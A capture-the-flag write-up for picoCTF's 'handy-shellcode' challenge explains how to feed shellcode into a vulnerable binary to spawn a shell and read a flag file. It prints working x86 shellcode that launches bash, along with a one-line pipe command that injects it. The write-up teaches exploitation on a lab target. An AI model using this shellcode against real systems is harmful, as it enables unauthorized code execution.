# handy-shellcode
This [program](https://github.com/Xaplomian/DissimuloPicoCTFWriteUps/raw/master/Binary%20Exploitation/handy-shellcode/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9 on the shell server. [Source](vuln.c). (50 points)

# Hint
You might be able to find some good shellcode online.

# Solution
Shellcode is a series of opcodes that we can write into the stdin of a program, which it will hopefully execute. Using the shellcode from [here](http://shell-storm.org/shellcode/files/shellcode-606.php) `"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"`. We will then supply the cat command, to keep the stdin open. This is what the shellscript should look like:
```bash
(python3 -c print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'); cat) | ./vuln
```
